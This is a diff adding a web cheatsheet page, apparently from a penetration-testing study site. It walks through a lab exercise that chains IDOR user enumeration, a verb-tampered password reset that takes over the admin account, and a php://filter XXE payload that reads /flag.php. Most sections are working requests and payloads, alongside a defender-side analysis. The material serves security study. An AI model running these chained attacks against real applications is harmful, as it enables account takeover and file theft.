@@ -1,0 +1,401 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Capstone chain · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › XXE</nav><h1>Capstone chain</h1><p class="cx-lede">The capstone end-to-end walkthrough - login as a low-privilege user, IDOR to enumerate accounts and discover the admin uid and password-reset token, verb-tamper a POST reset endpoint into a GET to bypass session check, log in as admin, reach an admin-only events feature with an XML endpoint, and XXE the flag out of /flag.php via php://filter base64 encoding. Every primitive in this cluster chained into one engagement.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1212, T1556, T1213, T1083</span><span class="cx-tag">D3FEND D3-IAA</span><span class="cx-tag">IMPACT DataExfil, AccountTakeover, PrivEsc</span><span class="cx-tag">OWASP A01, A05</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>A canonical engagement chain combining all three of this cluster's primitives. Five stages: login → IDOR enumeration to find admin uid and reset-token API → verb-tamper a POST reset into a GET to bypass session-binding → log in as the now-reset admin → use admin-only event-creation endpoint with XXE to read <code>/flag.php</code>.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># Stage 1 - Login as low-privilege user
+student / P@ssw0rd!     → uid=74
+
+# Stage 2 - IDOR enumeration via /api.php
+for uid in {1..100}; do curl &#x27;/api.php?uid=$uid&#x27;; done
+→ uid=52 has role=Administrator
+
+# Stage 3 - Settings page leaks /reset.php API and token
+grep &#x27;reset.php\|token&#x27; settings.php
+→ POST /reset.php with uid, token, new_password
+
+# Stage 4 - POST returns &quot;Access Denied&quot; (session-bound)
+#           Verb-tamper POST → GET (params move to URL)
+GET /reset.php?uid=52&amp;token=&lt;admin_token&gt;&amp;new_password=hacked
+→ admin password reset
+
+# Stage 5 - Log in as admin; events.php has XML endpoint
+POST /addEvent.php with crafted XML containing XXE
+&lt;!DOCTYPE name [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag.php&quot;&gt;]&gt;
+→ base64 in response; decode for the flag</code></pre></figure>
+<p>Success indicator: <code>FLAG{...}</code> flag value decoded from the base64-encoded <code>/flag.php</code> source code returned in the XXE response.</p>
+<h2 id="scenario">Scenario</h2>
+<p>A bug bounty engagement on a social-networking web app. Provided credentials: <code>student</code> / <code>P@ssw0rd!</code>. Goal: read <code>/flag.php</code>. The web app has multiple defenses but none individually is tight - chaining the gaps yields full compromise.</p>
+<p>This is a representative end-to-end chain, presented in the way the operator should approach a real engagement: one primitive at a time, verifying each step's effect, escalating until the chain completes.</p>
+<h2 id="stage-1-authenticate-and-map-the-surface">Stage 1 - Authenticate and map the surface</h2>
+<p>Log in with the provided credentials. After login you land on <code>/index.php</code> showing your own profile. Walk every UI link, intercept everything in Burp, build a mental map.</p>
+<p>What you can find without much effort:</p>
+<ul>
+<li><code>/profile.php</code> - your profile, with a "View other employees" link</li>
+<li><code>/profile.php?uid=74</code> - looking at this URL reveals your own uid</li>
+<li><code>/settings.php</code> - change password page (your password only)</li>
+<li><code>/events.php</code> - no link from your role's UI, but exists in the JS bundle</li>
+<li>View source on <code>/profile.php</code> reveals references to <code>/api.php</code></li>
+</ul>
+<p>Read the front-end JS / view the source of <code>/profile.php</code>:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;
+async function fetchProfile(uid) {
+    const r = await fetch(&#x27;/api.php?uid=&#x27; + uid);
+    return r.json();
+}
+fetchProfile(74).then(p =&gt; { ... });
+&lt;/script&gt;</code></pre></figure>
+<p>The page makes <code>GET /api.php?uid=&lt;n&gt;</code> to populate user details. Test if it's IDOR-vulnerable:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ curl -sb &#x27;PHPSESSID=mine&#x27; &#x27;http://target/api.php?uid=74&#x27; | jq
+{
+  &quot;uid&quot;: &quot;74&quot;,
+  &quot;username&quot;: &quot;student&quot;,
+  &quot;email&quot;: &quot;student@...&quot;,
+  &quot;role&quot;: &quot;Standard&quot;,
+  &quot;token&quot;: &quot;...&quot;
+}
+
+$ curl -sb &#x27;PHPSESSID=mine&#x27; &#x27;http://target/api.php?uid=1&#x27; | jq
+{
+  &quot;uid&quot;: &quot;1&quot;,
+  &quot;username&quot;: &quot;alice&quot;,
+  &quot;email&quot;: &quot;alice@...&quot;,
+  &quot;role&quot;: &quot;Standard&quot;,
+  &quot;token&quot;: &quot;df8e92...&quot;
+}</code></pre></figure>
+<p>Foreign uid returns foreign user data. <strong>IDOR confirmed on <code>/api.php</code></strong>. The <code>token</code> field is interesting - likely the password-reset token (more on this later).</p>
+<h2 id="stage-2-mass-enumerate-to-find-the-admin">Stage 2 - Mass-enumerate to find the admin</h2>
+<p>100 users in the system based on the API behavior. Loop:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ for uid in $(seq 1 100); do
+    curl -sb &#x27;PHPSESSID=mine&#x27; &quot;http://target/api.php?uid=$uid&quot;
+  done | jq -c &#x27;select(.uid != null)&#x27; &gt; all-users.json
+
+$ wc -l all-users.json
+100 all-users.json</code></pre></figure>
+<p>Filter for non-Standard roles:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ jq &#x27;select(.role != &quot;Standard&quot;)&#x27; all-users.json
+{
+  &quot;uid&quot;: &quot;52&quot;,
+  &quot;username&quot;: &quot;admin&quot;,
+  &quot;email&quot;: &quot;admin@...&quot;,
+  &quot;role&quot;: &quot;Administrator&quot;,
+  &quot;token&quot;: &quot;5e8e0fd92ee1b9d2640cf2a3eda7eb50&quot;
+}</code></pre></figure>
+<p>The admin is uid=52. The <code>token</code> field is <code>5e8e0fd92ee1b9d2640cf2a3eda7eb50</code> - capture this for the next stage.</p>
+<p>Two values acquired:
+- admin <code>uid</code> = 52
+- admin reset <code>token</code> = <code>5e8e0fd92ee1b9d2640cf2a3eda7eb50</code></p>
+<h2 id="stage-3-discover-the-reset-endpoint">Stage 3 - Discover the reset endpoint</h2>
+<p>Now visit <code>/settings.php</code> and view source. The page handles password changes for yourself - the front-end constructs a POST request to a specific endpoint:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;form id=&quot;resetForm&quot; action=&quot;/reset.php&quot; method=&quot;POST&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;uid&quot; value=&quot;74&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&lt;your-own-token&gt;&quot;&gt;
+    &lt;input name=&quot;new_password&quot; type=&quot;password&quot;&gt;
+    &lt;button&gt;Reset&lt;/button&gt;
+&lt;/form&gt;</code></pre></figure>
+<p>The reset is parameterized by uid + token. You have an admin's uid and token. The intended flow: a user resets their own password by submitting their own uid + own token. The implementation gap: does the endpoint verify the token belongs to the <em>requesting session</em>?</p>
+<h2 id="stage-4-attempt-the-naive-reset-and-the-access-denied-wall">Stage 4 - Attempt the naive reset (and the access-denied wall)</h2>
+<p>Send the reset request manually via Burp Repeater, substituting admin's uid + token:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /reset.php HTTP/1.1
+Host: target
+Cookie: PHPSESSID=mine
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 87
+
+uid=52&amp;token=5e8e0fd92ee1b9d2640cf2a3eda7eb50&amp;new_password=hacked123</code></pre></figure>
+<p>Response:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Access Denied</code></pre></figure>
+<p>The endpoint checks something beyond "is this a valid (uid, token) pair." Probably checks "does the session cookie belong to the same user whose uid is in the body" - a partial access-control defense.</p>
+<p>But - <code>Access Denied</code> is one specific check on the <em>POST</em> path. What about other verbs?</p>
+<h2 id="stage-5-verb-tamper-post-into-get">Stage 5 - Verb-tamper POST into GET</h2>
+<p>Flip the request method (see <a href="../../auth/verb-tampering/index.html">Verb tampering</a> for the full pattern). In Burp Repeater, right-click → "Change request method" - Burp moves the body parameters into the query string:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">GET /reset.php?uid=52&amp;token=5e8e0fd92ee1b9d2640cf2a3eda7eb50&amp;new_password=hacked123 HTTP/1.1
+Host: target
+Cookie: PHPSESSID=mine</code></pre></figure>
+<p>Response:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Password reset successfully</code></pre></figure>
+<p>The session-binding check fired only on the POST handler. The GET handler accepts the same parameters without the session check - classic verb-tampering filter inconsistency. Admin's password is now <code>hacked123</code>.</p>
+<h3 id="why-this-works-mechanically">Why this works mechanically</h3>
+<p>The server-side code likely looks like:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) {
+    if ($_SESSION[&#x27;uid&#x27;] !== $_POST[&#x27;uid&#x27;]) {
+        die(&quot;Access Denied&quot;);
+    }
+}
+$query = &quot;UPDATE users SET password = ? WHERE uid = ? AND token = ?&quot;;
+// uses $_REQUEST[&#x27;uid&#x27;], $_REQUEST[&#x27;token&#x27;], $_REQUEST[&#x27;new_password&#x27;]</code></pre></figure>
+<p>The session check is wrapped in <code>if (POST)</code>. GET requests skip the check entirely. The downstream SQL update uses <code>$_REQUEST</code>, which picks up GET parameters. The combined effect: GET version of the request changes any password given a valid (uid, token) pair - and IDOR gave you both.</p>
+<h2 id="stage-6-log-in-as-admin">Stage 6 - Log in as admin</h2>
+<p>Log out. Log in with <code>admin</code> / <code>hacked123</code>. Now you're admin (uid=52).</p>
+<p>The admin UI shows a feature the standard user didn't: an "Events" calendar at <code>/events.php</code>. View the page source:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;script&gt;
+async function addEvent(name, details, date) {
+    const xml = `&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;root&gt;
+  &lt;name&gt;${name}&lt;/name&gt;
+  &lt;details&gt;${details}&lt;/details&gt;
+  &lt;date&gt;${date}&lt;/date&gt;
+&lt;/root&gt;`;
+    const r = await fetch(&#x27;/addEvent.php&#x27;, {
+        method: &#x27;POST&#x27;,
+        headers: {&#x27;Content-Type&#x27;: &#x27;application/xml&#x27;},
+        body: xml,
+    });
+    return r.json();
+}
+&lt;/script&gt;</code></pre></figure>
+<p>The admin event-creation feature sends XML to <code>/addEvent.php</code>. XML-receiving endpoint = XXE candidate.</p>
+<h2 id="stage-7-probe-addeventphp-for-xxe">Stage 7 - Probe addEvent.php for XXE</h2>
+<p>Send a baseline event creation via Burp Repeater:</p>
+<figure class="cx-code"><figcaption>http</figcaption><pre><code class="language-http">POST /addEvent.php HTTP/1.1
+Host: target
+Cookie: PHPSESSID=admin-session; uid=52
+Content-Type: application/xml
+Content-Length: 153
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;root&gt;
+  &lt;name&gt;Test event&lt;/name&gt;
+  &lt;details&gt;hello&lt;/details&gt;
+  &lt;date&gt;01/01/2022&lt;/date&gt;
+&lt;/root&gt;</code></pre></figure>
+<p>Response:</p>
+<figure class="cx-code"><figcaption>json</figcaption><pre><code class="language-json">{&quot;status&quot;: &quot;created&quot;, &quot;name&quot;: &quot;Test event&quot;}</code></pre></figure>
+<p>The response echoes the <code>name</code> field. <strong><code>name</code> is the reflection point</strong> - perfect for entity-based exfil.</p>
+<p>Reflection probe:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root [
+  &lt;!ENTITY test &quot;PROOF_OF_LIFE&quot;&gt;
+]&gt;
+&lt;root&gt;
+  &lt;name&gt;&amp;test;&lt;/name&gt;
+  &lt;details&gt;x&lt;/details&gt;
+  &lt;date&gt;x&lt;/date&gt;
+&lt;/root&gt;</code></pre></figure>
+<p>Response:</p>
+<figure class="cx-code"><figcaption>json</figcaption><pre><code class="language-json">{&quot;status&quot;: &quot;created&quot;, &quot;name&quot;: &quot;PROOF_OF_LIFE&quot;}</code></pre></figure>
+<p>✓ Internal entities resolve. XXE confirmed.</p>
+<h2 id="stage-8-exfiltrate-flagphp">Stage 8 - Exfiltrate /flag.php</h2>
+<p>Target file is <code>/flag.php</code>. Direct <code>file://</code> would fail because PHP source contains <code>&lt;?php</code> (the <code>&lt;</code> breaks the parse). Use the <code>php://filter</code> wrapper for base64:</p>
+<figure class="cx-code"><figcaption>xml</figcaption><pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE name [
+  &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag.php&quot;&gt;
+]&gt;
+&lt;root&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;details&gt;hello&lt;/details&gt;
+  &lt;date&gt;01/01/2022&lt;/date&gt;
+&lt;/root&gt;</code></pre></figure>
+<p>Send via Burp Repeater. Response:</p>
+<figure class="cx-code"><figcaption>json</figcaption><pre><code class="language-json">{&quot;status&quot;: &quot;created&quot;, &quot;name&quot;: &quot;PD9waHAKJGZsYWcgPSAnSFRCe...K&quot;}</code></pre></figure>
+<p>The <code>name</code> field contains the base64-encoded source of <code>/flag.php</code>. Decode:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">$ echo &#x27;PD9waHAKJGZsYWcgPSAnSFRCe...K&#x27; | base64 -d
+&lt;?php
+$flag = &#x27;FLAG{actual_flag_value_here}&#x27;;
+?&gt;</code></pre></figure>
+<p>The flag value is in the <code>$flag</code> variable assignment. Capture and submit.</p>
+<h2 id="the-complete-chain-narrative">The complete chain - narrative</h2>
+<p>What just happened, end to end:</p>
+<ol>
+<li><strong>Authentication</strong> - given a low-privilege account</li>
+<li><strong>IDOR for disclosure</strong> - <code>/api.php?uid=N</code> returned arbitrary user records, including admin's uid and reset token</li>
+<li><strong>Settings page reveal</strong> - sourcecode of <code>/settings.php</code> exposed the <code>/reset.php</code> endpoint and its parameter shape</li>
+<li><strong>Verb tampering</strong> - <code>/reset.php</code> POST had a session-binding check; GET bypassed it</li>
+<li><strong>Password reset</strong> - armed with admin's (uid, token) and the GET-flip, reset admin's password</li>
+<li><strong>Privilege escalation</strong> - log in as admin</li>
+<li><strong>Feature discovery</strong> - admin UI exposed <code>/events.php</code> with XML-based <code>/addEvent.php</code> endpoint</li>
+<li><strong>XXE</strong> - XML endpoint reflected entity content in <code>name</code> field; used <code>php://filter/convert.base64-encode/resource=/flag.php</code> to read the flag</li>
+</ol>
+<p>Each step's primitive is in another page of this cluster:</p>
+<ul>
+<li>Step 2: <a href="../../idor/identifying/index.html">Identifying IDORs</a> and <a href="../../idor/mass-enumeration/index.html">Mass enumeration</a></li>
+<li>Step 3: <a href="../../idor/insecure-apis/index.html">Insecure APIs</a></li>
+<li>Step 4-5: <a href="../../auth/verb-tampering/index.html">Verb tampering</a></li>
+<li>Step 7-8: <a href="../identifying/index.html">Identifying XXE</a> and <a href="../file-disclosure/index.html">File disclosure</a></li>
+</ul>
+<p>The chain is what makes the engagement critical-severity. Each individual primitive is medium impact; together they're an unauthenticated-attacker-reads-/flag.php path.</p>
+<h2 id="why-each-defense-failed">Why each defense failed</h2>
+<p>Walking the defender's side of the chain:</p>
+<table>
+<thead>
+<tr>
+<th>Defense</th>
+<th>Why it failed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/api.php</code> not exposed in UI for foreign uid lookups</td>
+<td>The endpoint exists but lacks access control - any session can read any uid</td>
+</tr>
+<tr>
+<td>Reset endpoint session check</td>
+<td>Only applied on POST; GET bypassed entirely (verb scoping mistake)</td>
+</tr>
+<tr>
+<td>Reset endpoint token check</td>
+<td>Token check works fine - but the IDOR leaked the admin's token, so the (uid, token) pair was knowable</td>
+</tr>
+<tr>
+<td>Admin-only events feature gated in UI</td>
+<td>Backend gates on session role correctly (you had to actually become admin) - <em>this defense worked</em></td>
+</tr>
+<tr>
+<td>XML parser external entity resolution</td>
+<td>Outdated PHP libxml or <code>LIBXML_NOENT</code> set; external entities resolved with no protection</td>
+</tr>
+</tbody>
+</table>
+<p>The events feature is the only defense in the chain that worked - the rest collapsed at each step.</p>
+<h3 id="composite-impact-severity">Composite-impact severity</h3>
+<p>For the report:</p>
+<table>
+<thead>
+<tr>
+<th>Finding</th>
+<th>Standalone severity</th>
+<th>Chained role</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IDOR on <code>/api.php</code></td>
+<td>Medium</td>
+<td>Enabler - disclosed admin uid and reset token</td>
+</tr>
+<tr>
+<td>Verb tampering on <code>/reset.php</code></td>
+<td>Medium-High</td>
+<td>Bypassed session-binding check on password reset</td>
+</tr>
+<tr>
+<td>XXE on <code>/addEvent.php</code></td>
+<td>High (admin-only access required)</td>
+<td>Final unlock - flag retrieval</td>
+</tr>
+</tbody>
+</table>
+<p>Composite: critical. Low-privilege user reads <code>/flag.php</code> (effectively: arbitrary file read with root-equivalent access on the web app).</p>
+<h2 id="variations-the-operator-should-be-ready-for">Variations the operator should be ready for</h2>
+<h3 id="what-if-idor-isnt-on-apiphp">What if IDOR isn't on <code>/api.php</code></h3>
+<p>If <code>/api.php</code> returns 403 for foreign uids, the enumeration step fails. Look elsewhere:</p>
+<ul>
+<li>A user-search endpoint that returns shallow records (username + uid)</li>
+<li>An admin event-feed endpoint that lists user actions (the JS bundle may reveal it)</li>
+<li>A profile page that embeds a "view as employee X" admin tool with a URL parameter</li>
+</ul>
+<p>The token still needs to come from <em>somewhere</em>; if no IDOR works, the reset chain breaks entirely. In that case, look for other admin-privilege paths (LFI to read DB config, IDOR on a different field, role-cookie tampering - see <a href="../../auth/cookie-tampering/index.html">Cookie tampering</a>).</p>
+<h3 id="what-if-verb-tampering-doesnt-bypass">What if verb tampering doesn't bypass</h3>
+<p>The reset endpoint may check session-binding on every verb. Alternatives:</p>
+<ul>
+<li>The reset endpoint may use <code>_method=</code> body param tampering (see <a href="../../auth/verb-tampering/index.html">Verb tampering</a>)</li>
+<li>The token may be a JWT - if its signing is weak, forge an admin-token JWT (see <a href="../../auth/jwt/index.html">JWT</a>)</li>
+<li>The IDOR may also expose a different password-management endpoint that doesn't have the session check</li>
+</ul>
+<h3 id="what-if-xxe-is-blocked-on-addeventphp">What if XXE is blocked on <code>/addEvent.php</code></h3>
+<p>External entities may be disabled. Probe with a benign <code>&lt;!ENTITY test "x"&gt;</code> reflection test first. If even internal entities don't reflect, the parser may have <code>LIBXML_NONET</code> set or use a parser without entity support:</p>
+<ul>
+<li>Look for blind XXE via error-based or OOB (see <a href="../blind-exfil/index.html">Blind exfil</a>)</li>
+<li>Look for other XML endpoints - SOAP, document upload, RSS subscription</li>
+<li>Look for <code>/flag.php</code> via LFI, command injection, or RCE if other primitives surface</li>
+</ul>
+<h3 id="what-if-the-admin-lures-dont-work">What if the admin lures don't work</h3>
+<p>If admin never visits events.php in time for your XXE to fire (e.g., it's a system on-demand feature):</p>
+<ul>
+<li>Trigger the XXE yourself once you're admin - the chain doesn't need admin to <em>visit</em> the events page; you visit it directly as the now-reset-admin</li>
+</ul>
+<p>Most variations of the chain still resolve to the same flag-read mechanic. The specific primitives shift but the structure (disclosure → escalation → admin-feature → XXE → flag) is the canonical pattern.</p>
+<h2 id="operational-checklist">Operational checklist</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>Stage 0 - Recon
+  [ ] Login confirmed
+  [ ] Profile page mapped (own uid identified)
+  [ ] Settings page reviewed
+  [ ] JS bundles searched for AJAX endpoints
+  [ ] /api.php discovered (or equivalent user-lookup endpoint)
+
+Stage 1 - IDOR
+  [ ] Substitute uid; foreign user data returned
+  [ ] Mass enumerate uid 1..N
+  [ ] Filter for non-default role → admin uid identified
+  [ ] Reset token captured from admin record
+
+Stage 2 - Reset endpoint discovery
+  [ ] /reset.php parameters identified from settings.php source
+  [ ] POST attempt → &quot;Access Denied&quot;
+  [ ] Verb tamper to GET → &quot;Password reset successfully&quot;
+
+Stage 3 - Admin login
+  [ ] Logout, login as admin with new password
+  [ ] Admin UI surveyed for additional features
+  [ ] /events.php and /addEvent.php located
+
+Stage 4 - XXE
+  [ ] addEvent.php XML body crafted (baseline test)
+  [ ] Reflection point in `name` confirmed
+  [ ] Internal entity reflection probe passes
+  [ ] php://filter for /flag.php base64-encoded
+  [ ] Response decoded → flag value</code></pre></figure>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Command / payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mass-enumerate users</td>
+<td><code>for i in $(seq 1 100); do curl '/api.php?uid='$i; done</code></td>
+</tr>
+<tr>
+<td>Filter for admin</td>
+<td><code>jq 'select(.role != "Standard")' all-users.json</code></td>
+</tr>
+<tr>
+<td>Naive POST reset (blocked)</td>
+<td><code>POST /reset.php</code> body <code>uid=52&amp;token=...&amp;new_password=...</code></td>
+</tr>
+<tr>
+<td>Verb-tampered GET reset</td>
+<td><code>GET /reset.php?uid=52&amp;token=...&amp;new_password=...</code></td>
+</tr>
+<tr>
+<td>Burp method swap</td>
+<td>Right-click request → Change request method</td>
+</tr>
+<tr>
+<td>XML reflection probe</td>
+<td><code>&lt;!ENTITY test "PROOF"&gt;</code> referenced in <code>&lt;name&gt;</code></td>
+</tr>
+<tr>
+<td>Flag-read XXE</td>
+<td><code>&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"&gt;</code></td>
+</tr>
+<tr>
+<td>Decode response</td>
+<td><code>echo 'BASE64' \| base64 -d</code></td>
+</tr>
+<tr>
+<td>If POST has CSRF token</td>
+<td>Use <a href="../../sessions/csrf-token-bypass/index.html">CSRF token bypass</a></td>
+</tr>
+<tr>
+<td>If IDOR is partially defended</td>
+<td>See <a href="../../idor/insecure-apis/index.html">Insecure APIs</a> for the mismatch-defense bypasses</td>
+</tr>
+<tr>
+<td>If XXE responses are blind</td>
+<td><a href="../blind-exfil/index.html">Blind exfil</a> for OOB chain</td>
+</tr>
+<tr>
+<td>If <code>/flag.php</code> has <code>&lt;</code>/<code>&gt;</code>/<code>&amp;</code> issues</td>
+<td>Always use <code>php://filter/convert.base64-encode/</code> - never raw <code>file://</code></td>
+</tr>
+</tbody>
+</table>
+<p>This walkthrough covers the canonical pattern. Real engagements will swap primitives but retain the disclosure → escalation → admin-feature → XXE → flag arc.</p></article><nav class="cx-pager"><a class="cx-prev" href="../automation/index.html">Previous: Automation</a><a class="cx-next" href="../defense/index.html">Next: Defending Against XXE</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
